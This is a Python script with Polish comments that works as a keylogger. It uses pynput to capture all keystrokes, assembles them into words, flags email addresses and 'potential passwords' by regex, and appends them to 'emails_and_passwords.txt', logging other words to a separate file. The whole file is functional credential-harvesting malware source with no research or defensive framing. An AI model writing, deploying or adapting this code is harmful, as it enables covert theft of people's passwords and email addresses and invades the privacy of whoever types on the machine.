from pynput import keyboard
import re

# Zmienne globalne do przechowywania aktualnego słowa
current_word = ""
caps_lock_active = False  # Flaga do śledzenia stanu Caps Lock

def is_potential_password(word):
    # Sprawdza, czy słowo spełnia kryteria hasła
    return (len(word) >= 8 and
            (any(char.isdigit() for char in word) or
             any(char.isupper() for char in word) or
             any(not char.isalnum() for char in word)))

def is_email(word):
    # Prosta walidacja adresu e-mail z końcówką
    return re.match(r"^[^@]+@[^@]+\.[^@]+$", word) is not None

def save_to_file(filename, content):
    with open(filename, 'a') as file:  # Otwiera plik w trybie 'append'
        file.write(content + '\n')  # Dodaje treść do pliku

def on_press(key):
    global current_word, caps_lock_active  # Deklarujemy zmienne globalne

    try:
        # Sprawdzanie stanu Caps Lock
        if key == keyboard.Key.caps_lock:
            caps_lock_active = not caps_lock_active  # Przełączamy stan Caps Lock
            return  # Nie przetwarzaj dalej

        # Obsługa backspace - usuwanie ostatniego znaku
        if key == keyboard.Key.backspace:
            current_word = current_word[:-1]  # Usuwamy ostatni znak
            # print(f"Current word: {current_word}")  # Wyświetlamy aktualne słowo

        # Sprawdzamy, czy wciśnięto znak kończący zdanie
        elif key in {keyboard.Key.enter, keyboard.Key.space, keyboard.Key.tab}:
            if current_word:  # Jeśli słowo nie jest puste
                if is_email(current_word):  # Najpierw sprawdzamy, czy to e-mail
                    print(f"Potential Email: {current_word}")  # Wypisujemy potencjalny adres e-mail
                    save_to_file('emails_and_passwords.txt', current_word)  # Zapisujemy do pliku
                elif is_potential_password(current_word):  # Następnie sprawdzamy, czy to hasło
                    print(f"Potential Password: {current_word}")  # Wypisujemy potencjalne hasło
                    save_to_file('emails_and_passwords.txt', current_word)  # Zapisujemy do pliku
                else:
                    if not re.match(r"[.!?]", current_word):  # Sprawdzamy, czy słowo nie jest tylko znakiem kończącym
                        print(f"Normal word: {current_word}")  # Wypisujemy normalne słowo
                        save_to_file('normal_words.txt', current_word)  # Zapisujemy do innego pliku

                # Resetujemy słowo po wypisaniu
                current_word = ""

        elif hasattr(key, 'char') and key.char is not None:  # Tylko dodajemy, jeśli klawisz jest znakiem
            if key.char in {'!', '?', '.'}:
                # Jeśli wciśnięto znak kończący zdanie, dodajemy go do słowa
                current_word += key.char  # Dodajemy znak do aktualnego słowa
                print(f"Current word: {current_word}")  # Wyświetlamy aktualne słowo
            else:
                # Dodajemy znaki alfanumeryczne do słowa z uwzględnieniem Caps Lock
                if caps_lock_active:
                    current_word += key.char.upper()  # Dodajemy wielką literę
                else:
                    current_word += key.char.lower()  # Dodajemy małą literę
                print(f"Current word: {current_word}")  # Wyświetlamy aktualne słowo

    except Exception as e:
        print(f"Error: {e}")  # Obsługuje wszelkie inne błędy

def on_release(key):
    if key == keyboard.Key.page_down:
        return False  # Zatrzymujemy nasłuchiwanie


# Nasłuchiwanie klawiatury
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
